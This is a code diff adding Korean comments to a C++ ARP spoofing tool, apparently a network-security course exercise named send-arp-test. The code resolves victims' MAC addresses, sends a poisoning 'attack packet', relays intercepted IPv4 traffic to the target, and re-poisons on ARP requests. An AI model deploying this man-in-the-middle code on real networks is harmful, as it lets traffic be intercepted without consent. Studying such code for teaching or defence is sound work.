@@ -7,6 +7,7 @@ struct EthArpPacket final {
 };
 #pragma pack(pop)
 
+//attacker, sender, target ip, mac 저장할 구조체
 struct net_info {
 	unsigned int ipv4;
 	uint8_t mac[6];
@@ -18,7 +19,7 @@ void usage() {
 	printf("sample: send-arp-test wlan0 192.168.1.1 192.168.1.3 192.168.1.2 192.168.1.3\n");
 }
 
-
+//attacker mac, ip 받기
 void get_net_info(char *iface, uint8_t *mac, unsigned int *ip) {
     int fd;
     struct ifreq ifr;
@@ -34,15 +35,16 @@ void get_net_info(char *iface, uint8_t *mac, unsigned int *ip) {
     close(fd);
 }
 
-
+//main 이었던 함수 사실상 main
 int process_ip_pair(char* inface, char* sender_ip, char* target_ip) {
 	char* iface = inface;
 	struct net_info attacker;
 	struct net_info sender;
 	struct net_info target;
-	sender.ipv4 = Ip(sender_ip);
-	target.ipv4 = Ip(target_ip);
+	sender.ipv4 = Ip(sender_ip); //sender ip 저장
+	target.ipv4 = Ip(target_ip); //target ip 저장
 	get_net_info(inface, attacker.mac, &attacker.ipv4); // mac, ip 받아오기
+	
 	// sender에게 arp 요청 보내서 mac 받기 위한 arp 패킷 정의
 	EthArpPacket arp_packet_to_sender;
 	arp_packet_to_sender.eth_.dmac_ = Mac("FF-FF-FF-FF-FF-FF");
@@ -57,7 +59,7 @@ int process_ip_pair(char* inface, char* sender_ip, char* target_ip) {
 	arp_packet_to_sender.arp_.smac_ = Mac(attacker.mac);
 	arp_packet_to_sender.arp_.tmac_ = Mac("00-00-00-00-00-00");
 	arp_packet_to_sender.arp_.tip_ = htonl(Ip(sender_ip));
-
+	// target에게 arp 요청 보내서 mac 받기 위한 arp 패킷 정의
 	EthArpPacket arp_packet_to_target;
 	arp_packet_to_target.eth_.dmac_ = Mac("FF-FF-FF-FF-FF-FF");
 	arp_packet_to_target.eth_.smac_ = attacker.mac;
@@ -78,6 +80,7 @@ int process_ip_pair(char* inface, char* sender_ip, char* target_ip) {
 		fprintf(stderr, "couldn't open device %s(%s)\n", iface, errbuf);
 		return -1;
 	}
+	//arp send to sender
 	int res = pcap_sendpacket(packet, reinterpret_cast<const u_char*>(&arp_packet_to_sender), sizeof(EthArpPacket));
 	if (res != 0) {
 		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(packet));
@@ -88,11 +91,11 @@ int process_ip_pair(char* inface, char* sender_ip, char* target_ip) {
 		int res = pcap_next_ex(packet, &header, &re_packet);
 		EthArpPacket* reply = (EthArpPacket*)re_packet;
 		if (reply->arp_.sip_ == Ip(htonl(Ip(sender_ip)))){
-			memcpy(sender.mac, &reply->arp_.smac_, sizeof(sender.mac));
+			memcpy(sender.mac, &reply->arp_.smac_, sizeof(sender.mac)); // sender mac
 			break;
 		}
 	}
-
+	//arp send to target
 	res = pcap_sendpacket(packet, reinterpret_cast<const u_char*>(&arp_packet_to_target), sizeof(EthArpPacket));
 	if (res != 0) {
 		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(packet));
@@ -103,11 +106,11 @@ int process_ip_pair(char* inface, char* sender_ip, char* target_ip) {
 		int res = pcap_next_ex(packet, &header, &re_packet);
 		EthArpPacket* reply = (EthArpPacket*)re_packet;
 		if (reply->arp_.sip_ == Ip(htonl(Ip(target_ip)))){
-			memcpy(target.mac, &reply->arp_.smac_, sizeof(target.mac));
+			memcpy(target.mac, &reply->arp_.smac_, sizeof(target.mac)); // target mac
 			break;
 		}
 	}
-	fprintf(stderr, "1");
+
 	//공격 패킷 정의
 	EthArpPacket arp_packet;
 	arp_packet.eth_.dmac_ = sender.mac;
@@ -133,23 +136,19 @@ int process_ip_pair(char* inface, char* sender_ip, char* target_ip) {
 		const u_char* re_packet;
 		int res = pcap_next_ex(packet, &header, &re_packet);
 		u_char* relay_packet = new u_char[header->len];
-		memcpy(relay_packet, re_packet, header->len);
+		memcpy(relay_packet, re_packet, header->len); //relay_packet에 잡은 패킷 복사
 		libnet_ethernet_hdr *eth_hdr=(libnet_ethernet_hdr *)re_packet;
 		libnet_ipv4_hdr *ipv4_hdr=(libnet_ipv4_hdr *)(re_packet + 14);
 		if (ipv4_hdr->ip_dst.s_addr == htonl(Ip(target_ip))){
-			for(int i=0; i<6; i++){
-			relay_packet[i] = target.mac[i];
+			for(int i=0; i<6; i++){ //relay_packet mac 정상으로 수정
+			relay_packet[i] = target.mac[i]; 
 			}
-			fprintf(stderr, "5");
-			atk = pcap_sendpacket(packet, relay_packet, header->len);
+			atk = pcap_sendpacket(packet, relay_packet, header->len); //정상 패킷 target에게 send
 			if (atk != 0) {
 				fprintf(stderr, "pcap_sendpacket return %d error=%s\n", atk, pcap_geterr(packet));
 			}
-			
-			
-		
-		
 		}
+		//arp 유니캐스트 수신 시 공격 arp 패킷 전송
 		if ((ntohs(eth_hdr->ether_type) == 0x0806)){
 			EthArpPacket *tmp_eth = (EthArpPacket *)(re_packet);
 			if (tmp_eth->arp_.tip_ == Ip(htonl(Ip(target_ip))) && (tmp_eth->arp_.op_ == htons(ArpHdr::Request))){
@@ -161,7 +160,7 @@ int process_ip_pair(char* inface, char* sender_ip, char* target_ip) {
 		}
 	}
 	
-		pcap_close(packet);
+	pcap_close(packet);
 }
 
 int main(int argc, char* argv[]) {
